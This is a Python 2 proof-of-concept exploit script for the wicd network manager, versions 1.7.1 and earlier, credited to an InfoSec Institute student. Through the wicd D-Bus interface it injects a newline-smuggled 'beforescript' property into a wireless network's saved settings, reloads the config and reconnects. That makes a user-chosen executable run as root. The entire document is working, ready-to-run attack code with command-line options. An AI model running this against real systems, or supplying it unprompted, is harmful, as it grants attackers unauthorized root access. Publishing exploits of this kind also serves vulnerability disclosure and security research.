  #!/usr/bin/python
#wicd <= 1.7.1 0day exploit discovered on 4.9.12 by InfoSec Institute student
#For full write up and description go to http://www.infosecinstitute.com/courses/ethical_hacking_training.html
import sys
import os
import time
import getopt

try: from wicd import dbusmanager
except: print "[!] WICD Error: libraries are not available. Is WICD installed?"; sys.exit(0)

class Error(Exception):
	def __init__(self, error):
		self.errorStr=error
	
	def __str__(self):
		return repr(self.errorStr)
	

class Wicd():
	wireless=None
	daemon=None
	versionString=None
	def __init__(self):
		try: 
			dbusmanager.connect_to_dbus()
			dbusInterfaces	= dbusmanager.get_dbus_ifaces()
			self.wireless		= dbusInterfaces["wireless"]
			self.daemon		= dbusInterfaces["daemon"]
		except: 
			raise Error("Daemon is not running")
		self.versionString = self.daemon.Hello()
	
	def versionLessThan(self, version):
		if int(self.versionString.replace(".",""))<=version:
			return True
		else:
			return False
	

class Exploit():
	
	def __init__(self, wicd, scriptPath):
		self.wicd = wicd
		self.scriptPath = scriptPath
	
	def getNets(self):
		self.wicd.wireless.Scan(True)
		nets = self.wicd.wireless.GetNumberOfNetworks()
		while nets < 1:
			self.wicd.wireless.Scan(True)
			nets = self.wicd.wireless.GetNumberOfNetworks()
		for net in range(nets):
			yield net
	
	def exploit(self):
		
		for net in self.getNets(): pass # Priming scan.
		
		try:
			self.wicd.wireless.SetWirelessProperty(0, "beforescript = "+ self.scriptPath +"\nrooted", "true")
		except:
			raise Error("Unable to exploit (SetWirelessProperty() failed.)")
		
		try:
			self.wicd.wireless.SaveWirelessNetworkProperty(0, "beforescript = "+ self.scriptPath +"\nrooted")
		except:
			raise Error("Unable to exploit (SetWirelessProperty() failed.)")
		
		propertyKey	= 'bssid' # Could be essid, or any other identifiable wireless property
		vulnIdentifier	= self.wicd.wireless.GetWirelessProperty(0, propertyKey) 
		
		# TODO: Does this need a try construct?
		self.wicd.wireless.ReloadConfig()
		
		for net in self.getNets(): # Implicit, but required re-scan.
			if self.wicd.wireless.GetWirelessProperty(net, propertyKey) == vulnIdentifier:
				self.wicd.wireless.ConnectWireless(net)
				return True
		raise Error("Unable to exploit (Lost the network we were using)")
	

def usage():
	print "[!] Usage:"
	print "	( -h, --help ):"
	print "		Print this message."
	print "	( --scriptPath= ): Required, executable to run as root."
	print "		--scriptPath=/some/path/to/executable.sh"

def main():
	print "[$] WICD =< 1.7.0Day"
	try:
		opts, args = getopt.getopt(sys.argv[1:], "h", ["help", "scriptPath="])
	except getopt.GetoptError, err:
		# Print help information and exit:
		print '[!] Parameter error:' + str(err) # Will print something like "option -a not recognized"
		usage()
		sys.exit(0)
	
	scriptPath=None
	
	for opt, arg in opts:
		if opt in ("-h", "--help"):
			usage()
			sys.exit(0)
		elif opt =="--scriptPath":
			scriptPath=arg
		else:
			# I would be assuming to say we'll never get here.
			print "[!] Parameter error."
			usage()
			sys.exit(0)
	
	if not scriptPath:
		print "[!] Parameter error: scriptPath not set."
		usage()
		sys.exit(0)
	
	try:
		wicd = Wicd()
	except Error as error:
		print "[!] WICD Error: %s" % (error.errorStr)
		exit(0)
	print "[*] WICD Connection Initialized! (Version: %s)" % (wicd.versionString)
	
	if not wicd.versionLessThan(171): 
		print "[!] WICD Warning: version print exceeds 1.7.1: Trying anyhow."
	
	exploit = Exploit(wicd, scriptPath)
	
	print "[*] Attempting to exploit:"
	
	try:
		exploit.exploit()
	except Error as error:
		print "[!] Exploit Error: %s" % (error.errorStr)
		exit(0)
	print "[*] Exploit appears to have worked."

# Standard boilerplate to call the main() function to begin
# the program.
if __name__=='__main__':
	main()